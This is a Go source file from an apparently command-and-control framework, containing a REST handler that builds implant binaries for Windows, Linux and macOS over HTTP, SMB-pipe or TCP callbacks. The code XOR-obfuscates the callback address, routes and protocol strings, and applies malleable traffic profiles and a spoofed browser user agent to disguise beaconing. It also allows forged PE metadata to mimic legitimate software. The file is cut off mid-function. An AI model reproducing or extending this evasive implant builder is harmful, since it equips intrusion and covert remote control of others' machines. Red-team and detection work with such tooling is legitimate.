// internal/rest/handlers/payloads.go
package handlers

import (
	"context"
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"database/sql"
	"encoding/base64"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"io"
	"log"
	"math/big"
	"net/http"
	"os"
	"strconv"
	"strings"
	"time"

	"c2/internal/builder"
	wsbuilder "c2/internal/builder/websocket"
	"c2/internal/common/config"
	"c2/internal/websocket/agent"
	"c2/internal/websocket/listeners"

	"github.com/BurntSushi/toml"
	"github.com/gin-gonic/gin"
	"github.com/google/uuid"
)

type PayloadHandler struct {
	db              *sql.DB
	listenerManager *listeners.Manager
	agentClient     *agent.Client
	builder         builder.Builder
	agentConfig     *config.AgentConfig
}

func NewPayloadHandler(db *sql.DB, listenerManager *listeners.Manager, agentClient *agent.Client, agentCfg *config.AgentConfig, b builder.Builder) (*PayloadHandler, error) {
	return &PayloadHandler{
		db:              db,
		listenerManager: listenerManager,
		agentClient:     agentClient,
		builder:         b,
		agentConfig:     agentCfg,
	}, nil
}

// SetAgentClient updates the gRPC client
func (h *PayloadHandler) SetAgentClient(client *agent.Client) {
	h.agentClient = client
}

// Request/Response types
type BuildPayloadRequest struct {
	Listener       string       `json:"listener" binding:"required"`
	OS             string       `json:"os" binding:"required"`
	Arch           string       `json:"arch" binding:"required"`
	Language       string       `json:"language"`
	PayloadType    string       `json:"payload_type"`
	Features       []string     `json:"features,omitempty"`
	PipeName       string       `json:"pipe_name"`
	SMBProfile     string       `json:"smb_profile"`
	TCPProfile     string       `json:"tcp_profile"`
	TCPPort        string       `json:"tcp_port"`
	ProfileVariant    string       `json:"profile_variant"`
	PEFileDescription string       `json:"pe_file_description,omitempty"`
	PECompanyName     string       `json:"pe_company_name,omitempty"`
	PEProductName     string       `json:"pe_product_name,omitempty"`
	PEFileVersion     string       `json:"pe_file_version,omitempty"`
	PEProductVersion  string       `json:"pe_product_version,omitempty"`
	SafetyChecks      SafetyChecks `json:"safety_checks"`
}

type SafetyChecks struct {
	Hostname     string        `json:"hostname,omitempty"`
	Username     string        `json:"username,omitempty"`
	Domain       string        `json:"domain,omitempty"`
	FileCheck    *FileCheck    `json:"file_check,omitempty"`
	Process      string        `json:"process,omitempty"`
	KillDate     string        `json:"kill_date,omitempty"`
	WorkingHours *WorkingHours `json:"working_hours,omitempty"`
}

type FileCheck struct {
	Path      string `json:"path"`
	MustExist bool   `json:"must_exist"`
}

type WorkingHours struct {
	Start string `json:"start"`
	End   string `json:"end"`
}

type KeyPair struct {
	PrivateKeyPEM string
	PublicKeyPEM  string
}

// BuildPayload builds a payload and returns it directly
// POST /api/v1/payloads/build
func (h *PayloadHandler) BuildPayload(c *gin.Context) {
	startTime := time.Now()

	var req BuildPayloadRequest
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "invalid request body: " + err.Error()})
		return
	}

	// Validate OS
	osLower := strings.ToLower(req.OS)
	if osLower != "windows" && osLower != "linux" && osLower != "darwin" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "invalid OS, must be windows, linux, or darwin"})
		return
	}

	// Validate arch
	archLower := strings.ToLower(req.Arch)
	if archLower != "amd64" && archLower != "arm64" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "invalid arch, must be amd64 or arm64"})
		return
	}

	// Validate features if provided
	if len(req.Features) > 0 {
		validFeatures := getValidFeatures(osLower)
		for _, f := range req.Features {
			if !validFeatures[f] {
				c.JSON(http.StatusBadRequest, gin.H{"error": fmt.Sprintf("invalid feature '%s' for OS '%s'", f, osLower)})
				return
			}
		}
	}

	// Default values
	if req.Language == "" {
		req.Language = "go"
	}
	// Note: PayloadType is auto-detected from listener protocol in buildPayloadSync
	// If explicitly provided, validate it
	if req.PayloadType != "" && req.PayloadType != "http" && req.PayloadType != "smb" && req.PayloadType != "tcp" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "invalid payload_type, must be http, smb, or tcp"})
		return
	}

	// Get listener
	listener, exists := h.listenerManager.GetListener(req.Listener)
	if !exists {
		c.JSON(http.StatusNotFound, gin.H{"error": "listener not found"})
		return
	}

	// If a profile variant is specified, override the listener's profile bindings
	if req.ProfileVariant != "" && h.agentConfig != nil {
		_, _, _, err := h.agentConfig.ResolveVariant(req.ProfileVariant)
		if err != nil {
			c.JSON(http.StatusBadRequest, gin.H{"error": "profile variant error: " + err.Error()})
			return
		}
		v := h.agentConfig.GetProfileVariant(req.ProfileVariant)
		listener.GetProfile = v.GetProfile
		listener.PostProfile = v.PostProfile
		listener.ServerResponseProfile = v.ServerResponseProfile
		log.Printf("[REST API] Using profile variant %q: GET=%s POST=%s Response=%s",
			req.ProfileVariant, v.GetProfile, v.PostProfile, v.ServerResponseProfile)
	}

	// SMB pipe_name validation - can use listener's pipe_name as fallback
	listenerProtocol := strings.ToUpper(listener.Protocol)
	payloadType := strings.ToLower(req.PayloadType)
	if payloadType == "" && listenerProtocol == "SMB" {
		payloadType = "smb"
	}
	if payloadType == "smb" {
		// Use listener's pipe_name if not provided in request
		if req.PipeName == "" && listener.PipeName != "" {
			req.PipeName = listener.PipeName
			log.Printf("[REST API] Using pipe_name from listener: %s", req.PipeName)
		}
		// If still no pipe_name, use default
		if req.PipeName == "" {
			req.PipeName = "spoolss" // Default pipe name
			log.Printf("[REST API] Using default pipe_name: spoolss")
		}
	}

	// Build the payload synchronously
	binaryPath, binaryName, err := h.buildPayloadSync(c.Request.Context(), req, listener)
	if err != nil {
		log.Printf("Payload build failed: %v", err)
		c.JSON(http.StatusInternalServerError, gin.H{"error": "build failed: " + err.Error()})
		return
	}

	// Check if file exists
	if _, err := os.Stat(binaryPath); os.IsNotExist(err) {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "built payload not found"})
		return
	}

	// Open and stream the file
	file, err := os.Open(binaryPath)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to read payload"})
		return
	}
	defer file.Close()
	defer os.Remove(binaryPath) // Clean up after sending

	fileInfo, _ := file.Stat()
	fileSize := fileInfo.Size()

	// Set response headers
	c.Header("Content-Type", "application/octet-stream")
	c.Header("Content-Disposition", fmt.Sprintf("attachment; filename=\"%s\"", binaryName))
	c.Header("Content-Length", fmt.Sprintf("%d", fileSize))
	c.Header("X-Build-Duration", fmt.Sprintf("%.2fs", time.Since(startTime).Seconds()))

	// Stream file to response
	c.Status(http.StatusOK)
	io.Copy(c.Writer, file)
}

func (h *PayloadHandler) buildPayloadSync(ctx context.Context, req BuildPayloadRequest, listener *listeners.Listener) (string, string, error) {
	// Generate build identifiers
	initID := uuid.New()
	clientID := uuid.New()
	secret := generateRandomString(32)
	xorKey := generateRandomString(16)

	// Generate RSA keys
	keyPair, err := generateKeyPair()
	if err != nil {
		return "", "", fmt.Errorf("failed to generate keys: %v", err)
	}

	// Determine binary name
	osLower := strings.ToLower(req.OS)
	binaryName := fmt.Sprintf("payload_%s_%s", osLower, req.Arch)
	if osLower == "windows" {
		binaryName += ".exe"
	}

	// Determine payload type from listener protocol if not explicitly set
	// This matches the WebSocket service behavior
	listenerProtocol := strings.ToUpper(listener.Protocol)
	payloadType := strings.ToLower(req.PayloadType)

	if payloadType == "" {
		if listenerProtocol == "SMB" {
			payloadType = "smb"
			log.Printf("[REST Builder] Auto-detected SMB payload type from listener protocol")
		} else if listenerProtocol == "TCP" {
			payloadType = "tcp"
			log.Printf("[REST Builder] Auto-detected TCP payload type from listener protocol")
		} else {
			payloadType = "http" // Default to HTTP for HTTP/HTTPS/RPC
		}
	}
	req.PayloadType = payloadType

	// Determine connection type - this is what gets stored in DB and sent to agent service
	// "edge" for HTTP/HTTPS agents, "link" for SMB/RPC/TCP agents
	connectionType := "edge"
	if payloadType == "smb" || payloadType == "tcp" || listenerProtocol == "SMB" || listenerProtocol == "RPC" || listenerProtocol == "TCP" {
		connectionType = "link"
	}

	log.Printf("[REST Builder] Building payload - protocol=%s, payload_type=%s, connection_type=%s",
		listenerProtocol, payloadType, connectionType)

	// Generate per-build XOR keys for SMB/TCP/HTTP transforms (matches WS builder)
	smbXorKey := generateRandomString(12)
	tcpXorKey := generateRandomString(12)
	httpXorKey := xorKey

	// Resolve SMB profile from request or listener fallback
	smbProfile := req.SMBProfile
	if smbProfile == "" && listener.SMBProfile != "" {
		smbProfile = listener.SMBProfile
		log.Printf("[REST Builder] Using listener's SMB profile: %s", smbProfile)
	}

	// Resolve TCP profile from request or listener fallback
	tcpProfile := req.TCPProfile
	if tcpProfile == "" && listener.TCPProfile != "" {
		tcpProfile = listener.TCPProfile
		log.Printf("[REST Builder] Using listener's TCP profile: %s", tcpProfile)
	}

	// Resolve TCP port from request, listener, or default
	tcpPort := req.TCPPort
	if tcpPort == "" && payloadType == "tcp" {
		tcpPort = strconv.Itoa(listener.Port)
		if tcpPort == "0" {
			tcpPort = "4444"
		}
	}

	// Store in database with full column set (matches WS builder)
	err = h.storeInit(ctx, initID, clientID, connectionType, secret, osLower, req.Arch,
		keyPair.PrivateKeyPEM, smbProfile, smbXorKey, httpXorKey, tcpProfile, tcpXorKey,
		strings.ToUpper(payloadType))
	if err != nil {
		return "", "", fmt.Errorf("failed to store init: %v", err)
	}

	// Register with agent service (matches WS builder fields)
	if h.agentClient != nil {
		initData := map[string]string{
			"id":         initID.String(),
			"clientID":   clientID.String(),
			"type":       connectionType,
			"secret":     secret,
			"os":         osLower,
			"arch":       req.Arch,
			"rsaKey":     keyPair.PrivateKeyPEM,
			"protocol":   listener.Protocol,
			"smbProfile": smbProfile,
			"smbXorKey":  smbXorKey,
			"httpXorKey": httpXorKey,
			"tcpProfile": tcpProfile,
			"tcpXorKey":  tcpXorKey,
			"tcpPort":    tcpPort,
		}
		h.agentClient.RegisterInit(ctx, initData)
	}

	// Load payload config
	payloadConfig, _, _, err := h.loadPayloadConfig()
	if err != nil {
		return "", "", fmt.Errorf("failed to load config: %v", err)
	}

	// Prepare environment variables
	envVars, err := h.prepareEnvVars(req, listener, clientID, secret, xorKey, keyPair, binaryName, payloadConfig)
	if err != nil {
		return "", "", fmt.Errorf("failed to prepare env vars: %v", err)
	}

	// Build the payload
	result, err := h.builder.Build(ctx, &builder.BuildRequest{
		EnvVars:    envVars,
		BinaryName: binaryName,
	})
	if err != nil {
		return "", "", fmt.Errorf("build failed: %v", err)
	}

	return result.BinaryPath, binaryName, nil
}

func (h *PayloadHandler) storeInit(ctx context.Context, initID, clientID uuid.UUID, payloadType, secret, os, arch, rsaKey, smbProfile, smbXorKey, httpXorKey, tcpProfile, tcpXorKey, protocol string) error {
	_, err := h.db.ExecContext(ctx, `
		INSERT INTO inits (id, clientID, type, secret, os, arch, RSAkey, smb_profile, smb_xor_key, http_xor_key, tcp_profile, tcp_xor_key, protocol)
		VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11, $12, $13)
	`, initID, clientID, payloadType, secret, os, arch, rsaKey, smbProfile, smbXorKey, httpXorKey, tcpProfile, tcpXorKey, protocol)
	return err
}

func (h *PayloadHandler) loadPayloadConfig() (map[string]interface{}, map[string]interface{}, map[string]interface{}, error) {
	configPath := os.Getenv("CONFIG_FILE")
	if configPath == "" {
		configPath = "/app/config.toml"
	}

	var rawConfig map[string]interface{}
	if _, err := toml.DecodeFile(configPath, &rawConfig); err != nil {
		return nil, nil, nil, err
	}

	payloadConfig := make(map[string]interface{})
	httpRoutes := make(map[string]interface{})
	malleableConfig := make(map[string]interface{})

	if pc, ok := rawConfig["payload_config"].(map[string]interface{}); ok {
		payloadConfig = pc
		if mc, ok := pc["malleable_commands"].(map[string]interface{}); ok {
			malleableConfig = mc
		}
	}

	if hr, ok := rawConfig["http_routes"].(map[string]interface{}); ok {
		httpRoutes = hr
	}

	return payloadConfig, httpRoutes, malleableConfig, nil
}

func (h *PayloadHandler) prepareEnvVars(req BuildPayloadRequest, listener *listeners.Listener, clientID uuid.UUID, secret, xorKey string, keyPair *KeyPair, binaryName string, payloadConfig map[string]interface{}) ([]string, error) {
	// Get config values with defaults
	sleep := 20
	jitter := 10
	userAgent := "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
	contentType := "application/json"

	if s, ok := payloadConfig["sleep"].(int64); ok {
		sleep = int(s)
	}
	if j, ok := payloadConfig["jitter"].(int64); ok {
		jitter = int(j)
	}
	if hh, ok := payloadConfig["http_headers"].(map[string]interface{}); ok {
		if ua, ok := hh["user_agent"].(string); ok {
			userAgent = ua
		}
		if ct, ok := hh["content_type"].(string); ok {
			contentType = ct
		}
	}

	// Extract GET handler details from listener's bound profile
	if listener.GetProfile == "" {
		return nil, fmt.Errorf("listener %q has no GET profile bound", listener.Name)
	}
	if h.agentConfig == nil {
		return nil, fmt.Errorf("agent config not loaded")
	}
	getProfile := h.agentConfig.GetGetProfile(listener.GetProfile)
	if getProfile == nil {
		return nil, fmt.Errorf("GET profile %q not found", listener.GetProfile)
	}
	getRoute := getProfile.Path
	getMethod := "GET"
	if getProfile.Method != "" {
		getMethod = getProfile.Method
	}
	var getClientIDName, getClientIDFormat string
	for _, param := range getProfile.Params {
		if param.Type == "clientID_param" {
			getClientIDName = param.Name
			getClientIDFormat = param.Format
			break
		}
	}

	// Extract POST handler details from listener's bound profile
	if listener.PostProfile == "" {
		return nil, fmt.Errorf("listener %q has no POST profile bound", listener.Name)
	}
	postProfile := h.agentConfig.GetPostProfile(listener.PostProfile)
	if postProfile == nil {
		return nil, fmt.Errorf("POST profile %q not found", listener.PostProfile)
	}
	postRoute := postProfile.Path
	postMethod := "POST"
	if postProfile.Method != "" {
		postMethod = postProfile.Method
	}
	var postClientIDName, postClientIDFormat string
	var postSecretName, postSecretFormat string
	for _, param := range postProfile.Params {
		switch param.Type {
		case "clientID_param":
			postClientIDName = param.Name
			postClientIDFormat = param.Format
		case "secret_param":
			postSecretName = param.Name
			postSecretFormat = param.Format
		}
	}

	// Rekey config from listener's bound server response profile
	if listener.ServerResponseProfile == "" {
		return nil, fmt.Errorf("listener %q has no server response profile bound", listener.Name)
	}
	respProfile := h.agentConfig.GetServerResponseProfile(listener.ServerResponseProfile)
	if respProfile == nil {
		return nil, fmt.Errorf("server response profile %q not found", listener.ServerResponseProfile)
	}
	rekeyCommand := "rekey"
	rekeyStatusField := "status"
	rekeyDataField := "data"
	rekeyIDField := "command_db_id"
	if respProfile.RekeyValue != "" {
		rekeyCommand = respProfile.RekeyValue
	}
	if respProfile.StatusField != "" {
		rekeyStatusField = respProfile.StatusField
	}
	if respProfile.DataField != "" {
		rekeyDataField = respProfile.DataField
	}
	if respProfile.CommandIDField != "" {
		rekeyIDField = respProfile.CommandIDField
	}

	// Build custom headers JSON - read from config if available
	customHeaders := make(map[string]string)
	if hh, ok := payloadConfig["http_headers"].(map[string]interface{}); ok {
		if ch, ok := hh["custom_headers"].([]interface{}); ok {
			for _, h := range ch {
				if header, ok := h.(map[string]interface{}); ok {
					name, _ := header["name"].(string)
					value, _ := header["value"].(string)
					if name != "" {
						customHeaders[name] = value
					}
				}
			}
		}
	}
	// Add defaults if no custom headers in config
	if len(customHeaders) == 0 {
		customHeaders = map[string]string{
			"Accept":          "*/*",
			"Accept-Language": "en-US,en;q=0.9",
			"Connection":      "close",
		}
	}
	customHeadersJSON, _ := json.Marshal(customHeaders)

	// Create base environment variables (matching WebSocket service format)
	envVars := []string{
		"BUILD=TRUE",
		fmt.Sprintf("XOR_KEY=%s", xorKey),
		fmt.Sprintf("OS=%s", strings.ToLower(req.OS)),
		fmt.Sprintf("ARCH=%s", req.Arch),
		fmt.Sprintf("OUTPUT_FILENAME=%s", binaryName),
		fmt.Sprintf("CLIENTID=%s", clientID.String()),
		fmt.Sprintf("SLEEP=%d", sleep), // Pass raw value like WebSocket service
		fmt.Sprintf("JITTER=%d", jitter),
		fmt.Sprintf("MALLEABLE_REKEY_COMMAND=%s", rekeyCommand),
		fmt.Sprintf("MALLEABLE_REKEY_STATUS_FIELD=%s", rekeyStatusField),
		fmt.Sprintf("MALLEABLE_REKEY_DATA_FIELD=%s", rekeyDataField),
		fmt.Sprintf("MALLEABLE_REKEY_ID_FIELD=%s", rekeyIDField),
		fmt.Sprintf("PAYLOAD_TYPE=%s", req.PayloadType),
	}

	// Add features for modular builds (empty = all features, non-empty = selected only)
	if len(req.Features) > 0 {
		envVars = append(envVars, fmt.Sprintf("FEATURES=%s", strings.Join(req.Features, ",")))
		log.Printf("[REST Builder] Modular build with features: %v", req.Features)
	}

	// Load unified link malleable config for payload injection (shared between SMB and TCP)
	linkMalleable, linkErr := config.GetLinkMalleable()
	if linkErr != nil {
		log.Printf("[REST Builder] Warning: Failed to load link config, using defaults: %v", linkErr)
	}
	envVars = append(envVars,
		fmt.Sprintf("MALLEABLE_LINK_DATA_FIELD=%s", linkMalleable.LinkDataField),
		fmt.Sprintf("MALLEABLE_LINK_COMMANDS_FIELD=%s", linkMalleable.LinkCommandsField),
		fmt.Sprintf("MALLEABLE_LINK_HANDSHAKE_FIELD=%s", linkMalleable.LinkHandshakeField),
		fmt.Sprintf("MALLEABLE_LINK_HANDSHAKE_RESP_FIELD=%s", linkMalleable.LinkHandshakeResponseField),
		fmt.Sprintf("MALLEABLE_LINK_UNLINK_FIELD=%s", linkMalleable.LinkUnlinkField),
		fmt.Sprintf("MALLEABLE_ROUTING_ID_FIELD=%s", linkMalleable.RoutingIDField),
		fmt.Sprintf("MALLEABLE_PAYLOAD_FIELD=%s", linkMalleable.PayloadField),
	)

	// Add SMB-specific config (matching WebSocket service)
	if req.PayloadType == "smb" {
		envVars = append(envVars, fmt.Sprintf("PIPE_NAME=%s", req.PipeName))

		// Create encrypted config for SMB agent (same as WebSocket service)
		// The config is XOR encrypted with the PLAIN secret
		smbConfig := map[string]string{
			"pn": req.PipeName,
			"sk": secret,
			"pk": keyPair.PublicKeyPEM,
		}
		configJSON, _ := json.Marshal(smbConfig)

		// XOR encrypt config with the plain secret
		secretBytes := []byte(secret)
		encrypted := make([]byte, len(configJSON))
		for i, b := range configJSON {
			encrypted[i] = b ^ secretBytes[i%len(secretBytes)]
		}
		encryptedConfig := base64.StdEncoding.EncodeToString(encrypted)

		envVars = append(envVars, fmt.Sprintf("ENCRYPTED_CONFIG=%s", encryptedConfig))
		log.Printf("[REST Builder] Created encrypted SMB config for pipe: %s", req.PipeName)
	}

	// Add TCP-specific config (similar to SMB)
	if req.PayloadType == "tcp" {
		tcpPort := req.TCPPort
		if tcpPort == "" {
			tcpPort = strconv.Itoa(listener.Port)
			if tcpPort == "0" {
				tcpPort = "4444"
			}
		}
		envVars = append(envVars, fmt.Sprintf("TCP_PORT=%s", tcpPort))

		// Create encrypted config for TCP agent (same pattern as SMB)
		// The config is XOR encrypted with the PLAIN secret
		tcpConfig := map[string]string{
			"tp": tcpPort,
			"sk": secret,
			"pk": keyPair.PublicKeyPEM,
		}
		configJSON, _ := json.Marshal(tcpConfig)

		// XOR encrypt config with the plain secret
		secretBytes := []byte(secret)
		encrypted := make([]byte, len(configJSON))
		for i, b := range configJSON {
			encrypted[i] = b ^ secretBytes[i%len(secretBytes)]
		}
		encryptedConfig := base64.StdEncoding.EncodeToString(encrypted)

		envVars = append(envVars, fmt.Sprintf("ENCRYPTED_CONFIG=%s", encryptedConfig))
		log.Printf("[REST Builder] Created encrypted TCP config for port: %s", tcpPort)
	}

	// Add encrypted config values
	envVars = append(envVars,
		fmt.Sprintf("PUBLIC_KEY=%s", xorEncrypt(keyPair.PublicKeyPEM, xorKey)),
		fmt.Sprintf("SECRET=%s", xorEncrypt(secret, xorKey)),
		fmt.Sprintf("PROTOCOL=%s", xorEncrypt(listener.Protocol, xorKey)),
		fmt.Sprintf("IP=%s", xorEncrypt(listener.IP, xorKey)),
		fmt.Sprintf("PORT=%s", xorEncrypt(strconv.Itoa(listener.Port), xorKey)),
		fmt.Sprintf("GET_METHOD=%s", xorEncrypt(getMethod, xorKey)),
		fmt.Sprintf("POST_METHOD=%s", xorEncrypt(postMethod, xorKey)),
		fmt.Sprintf("USER_AGENT=%s", xorEncrypt(userAgent, xorKey)),
		fmt.Sprintf("CONTENT_TYPE=%s", xorEncrypt(contentType, xorKey)),
		fmt.Sprintf("CUSTOM_HEADERS=%s", xorEncrypt(string(customHeadersJSON), xorKey)),
		fmt.Sprintf("GET_ROUTE=%s", xorEncrypt(getRoute, xorKey)),
		fmt.Sprintf("POST_ROUTE=%s", xorEncrypt(postRoute, xorKey)),
		fmt.Sprintf("GET_CLIENT_ID_NAME=%s", xorEncrypt(getClientIDName, xorKey)),
		fmt.Sprintf("GET_CLIENT_ID_FORMAT=%s", xorEncrypt(getClientIDFormat, xorKey)),
		fmt.Sprintf("POST_CLIENT_ID_NAME=%s", xorEncrypt(postClientIDName, xorKey)),
		fmt.Sprintf("POST_CLIENT_ID_FORMAT=%s", xorEncrypt(postClientIDFormat, xorKey)),
		fmt.Sprintf("POST_SECRET_NAME=%s", xorEncrypt(postSecretName, xorKey)),
		fmt.Sprintf("POST_SECRET_FORMAT=%s", xorEncrypt(postSecretFormat, xorKey)),
	)

	// Generate transform configs from malleable profiles
	var getClientIDTransforms, postClientIDTransforms, postDataTransforms, responseDataTransforms string
	if listener.GetProfile != "" && h.agentConfig != nil {
		if getProfile := h.agentConfig.GetGetProfile(listener.GetProfile); getProfile != nil {
			if getProfile.ClientID != nil {
				getClientIDTransforms = wsbuilder.SerializeDataBlockCompact(getProfile.ClientID)
			}
		}
	}
	if listener.PostProfile != "" && h.agentConfig != nil {
		if postProfile := h.agentConfig.GetPostProfile(listener.PostProfile); postProfile != nil {
			if postProfile.ClientID != nil {
				postClientIDTransforms = wsbuilder.SerializeDataBlockCompact(postProfile.ClientID)
			}
			if postProfile.Data != nil {
				postDataTransforms = wsbuilder.SerializeDataBlockCompact(postProfile.Data)
			}
		}
	}
	if listener.ServerResponseProfile != "" && h.agentConfig != nil {
		if respProfile := h.agentConfig.GetServerResponseProfile(listener.ServerResponseProfile); respProfile != nil {
			if respProfile.Data != nil {
				responseDataTransforms = wsbuilder.SerializeDataBlockCompact(respProfile.Data)
			}
		}
	}

	padPreHeader := "X-Cache-Seq"
	padAppHeader := "X-Cache-Idx"
	if listener.PostProfile != "" && h.agentConfig != nil {
		if pp := h.agentConfig.GetPostProfile(listener.PostProfile); pp != nil {
			if pp.PadPreHeader != "" {
				padPreHeader = pp.PadPreHeader
			}
			if pp.PadAppHeader != "" {
				padAppHeader = pp.PadAppHeader
			}
		}
	}

	envVars = append(envVars,
		fmt.Sprintf("GET_CLIENTID_TRANSFORMS=%s", xorEncrypt(getClientIDTransforms, xorKey)),
		fmt.Sprintf("POST_CLIENTID_TRANSFORMS=%s", xorEncrypt(postClientIDTransforms, xorKey)),
		fmt.Sprintf("POST_DATA_TRANSFORMS=%s", xorEncrypt(postDataTransforms, xorKey)),
		fmt.Sprintf("RESPONSE_DATA_TRANSFORMS=%s", xorEncrypt(responseDataTransforms, xorKey)),
	)

	envVars = append(envVars,
		fmt.Sprintf("PROTO_TYPE_HANDSHAKE=%s", xorEncrypt("handshake", xorKey)),
		fmt.Sprintf("PROTO_TYPE_HS_RESP=%s", xorEncrypt("handshake_response", xorKey)),
		fmt.Sprintf("PROTO_TYPE_PING=%s", xorEncrypt("ping", xorKey)),
		fmt.Sprintf("PROTO_TYPE_PONG=%s", xorEncrypt("pong", xorKey)),
		fmt.Sprintf("PROTO_TYPE_DATA=%s", xorEncrypt("data", xorKey)),
		fmt.Sprintf("PROTO_TYPE_DISCONNECT=%s", xorEncrypt("disconnect", xorKey)),
		fmt.Sprintf("PROTO_TYPE_LINK_HS=%s", xorEncrypt("link_handshake_response", xorKey)),
		fmt.Sprintf("PROTO_KEY_TYPE=%s", xorEncrypt("type", xorKey)),
		fmt.Sprintf("PROTO_KEY_PAYLOAD=%s", xorEncrypt("payload", xorKey)),
		fmt.Sprintf("PROTO_KEY_AGENT_ID=%s", xorEncrypt("agent_id", xorKey)),
		fmt.Sprintf("PROTO_KEY_RESULTS=%s", xorEncrypt("results", xorKey)),
		fmt.Sprintf("PROTO_KEY_COMMANDS=%s", xorEncrypt("commands", xorKey)),
		fmt.Sprintf("PROTO_KEY_SR=%s", xorEncrypt("sr", xorKey)),
		fmt.Sprintf("PROTO_AUTH_PREFIX=%s", xorEncrypt("AUTH:", xorKey)),
		fmt.Sprintf("PROTO_AUTH_OK=%s", xorEncrypt("OK", xorKey)),
		fmt.Sprintf("PROTO_META_STARTUP=%s", xorEncrypt("startup_time", xorKey)),
		fmt.Sprintf("PROTO_META_ACTIVE=%s", xorEncrypt("active", xorKey)),
	)

	envVars = append(envVars,
		fmt.Sprintf("GE_METHOD_GET=%s", xorEncrypt("GET", xorKey)),
		fmt.Sprintf("GE_METHOD_POST=%s", xorEncrypt("POST", xorKey)),
		fmt.Sprintf("GE_PROTO_HTTPS=%s", xorEncrypt("https", xorKey)),
		fmt.Sprintf("GE_PROTO_HTTP=%s", xorEncrypt("http", xorKey)),
		fmt.Sprintf("GE_PORT_443=%s", xorEncrypt("443", xorKey)),
		fmt.Sprintf("GE_PORT_80=%s", xorEncrypt("80", xorKey)),
		fmt.Sprintf("GE_FMT_URL_NO_PORT=%s", xorEncrypt("%s://%s", xorKey)),
		fmt.Sprintf("GE_FMT_URL_WITH_PORT=%s", xorEncrypt("%s://%s:%s", xorKey)),
		fmt.Sprintf("GE_FMT_URL_QUERY=%s", xorEncrypt("%s%s?%s=%s", xorKey)),
		fmt.Sprintf("GE_SLASH=%s", xorEncrypt("/", xorKey)),
	)

	envVars = append(envVars,
		fmt.Sprintf("HTTP_HEADER_USER_AGENT=%s", xorEncrypt("User-Agent", xorKey)),
		fmt.Sprintf("HTTP_HEADER_CONTENT_TYPE=%s", xorEncrypt("Content-Type", xorKey)),
		fmt.Sprintf("HTTP_HEADER_PAD_PRE=%s", xorEncrypt(padPreHeader, xorKey)),
		fmt.Sprintf("HTTP_HEADER_PAD_APP=%s", xorEncrypt(padAppHeader, xorKey)),
		fmt.Sprintf("HTTP_META_ID=%s", xorEncrypt("id", xorKey)),
		fmt.Sprintf("HTTP_META_ENCRYPTION=%s", xorEncrypt("encryption", xorKey)),
		fmt.Sprintf("HTTP_ENC_RSA_AES=%s", xorEncrypt("rsa+aes", xorKey)),
	)

	jsonFields, err := wsbuilder.GenerateJSONFieldNames()
	if err != nil {
		return nil, fmt.Errorf("failed to generate JSON field names: %v", err)
	}
	for fieldName, fieldValue := range jsonFields {
		envVars = append(envVars, fmt.Sprintf("%s=%s", fieldName, xorEncrypt(fieldValue, xorKey)))
	}

	// Add safety checks (XOR encrypted to protect target identifiers)
	if req.SafetyChecks.Hostname != "" {
		envVars = append(envVars, fmt.Sprintf("SAFETY_HOSTNAME=%s", xorEncrypt(req.SafetyChecks.Hostname, xorKey)))
	}
	if req.SafetyChecks.Username != "" {
		envVars = append(envVars, fmt.Sprintf("SAFETY_USERNAME=%s", xorEncrypt(req.SafetyChecks.Username, xorKey)))
	}
	if req.SafetyChecks.Domain != "" {
		envVars = append(envVars, fmt.Sprintf("SAFETY_DOMAIN=%s", xorEncrypt(req.SafetyChecks.Domain, xorKey)))
	}
	if req.SafetyChecks.Process != "" {
		envVars = append(envVars, fmt.Sprintf("SAFETY_PROCESS=%s", xorEncrypt(req.SafetyChecks.Process, xorKey)))
	}
	if req.SafetyChecks.KillDate != "" {
		envVars = append(envVars, fmt.Sprintf("SAFETY_KILL_DATE=%s", xorEncrypt(req.SafetyChecks.KillDate, xorKey)))
	}

	if req.SafetyChecks.FileCheck != nil && req.SafetyChecks.FileCheck.Path != "" {
		envVars = append(envVars,
			fmt.Sprintf("SAFETY_FILE_PATH=%s", xorEncrypt(req.SafetyChecks.FileCheck.Path, xorKey)),
			fmt.Sprintf("SAFETY_FILE_MUST_EXIST=%s", xorEncrypt(fmt.Sprintf("%t", req.SafetyChecks.FileCheck.MustExist), xorKey)),
		)
	}

	if req.SafetyChecks.WorkingHours != nil {
		if req.SafetyChecks.WorkingHours.Start != "" {
			envVars = append(envVars, fmt.Sprintf("SAFETY_WORK_HOURS_START=%s", xorEncrypt(req.SafetyChecks.WorkingHours.Start, xorKey)))
		}
		if req.SafetyChecks.WorkingHours.End != "" {
			envVars = append(envVars, fmt.Sprintf("SAFETY_WORK_HOURS_END=%s", xorEncrypt(req.SafetyChecks.WorkingHours.End, xorKey)))
		}
	}

	if req.PEFileDescription != "" {
		envVars = append(envVars, fmt.Sprintf("PE_FILE_DESCRIPTION=%s", req.PEFileDescription))
	}
	if req.PECompanyName != "" {
		envVars = append(envVars, fmt.Sprintf("PE_COMPANY_NAME=%s", req.PECompanyName))
	}
	if req.PEProductName != "" {
		envVars = append(envVars, fmt.Sprintf("PE_PRODUCT_NAME=%s", req.PEProductName))
	}
	if req.PEFileVersion != "" {
		envVars = append(envVars, fmt.Sprintf("PE_FILE_VERSION=%s", req.PEFileVersion))
	}
	if req.PEProductVersion != "" {
		envVars = append(envVars, fmt.Sprintf("PE_PRODUCT_VERSION=%s", req.PEProductVersion))
	}

	return envVars, nil
}


// Helper functions
func generateRandomString(length int) string {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, length)
	for i := range b {
		n, _ := rand.Int(rand.Reader, big.NewInt(int64(len(charset))))
		b[i] = charset[n.Int64()]
	}
	return string(b)
}

func generateKeyPair() (*KeyPair, error) {
	privateKey, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return nil, err
	}

	// Encode private key - use PKCS1 format and base64 encode for storage
	privateKeyBytes := x509.MarshalPKCS1PrivateKey(privateKey)
	privateKeyPEM := pem.EncodeToMemory(&pem.Block{
		Type:  "RSA PRIVATE KEY",
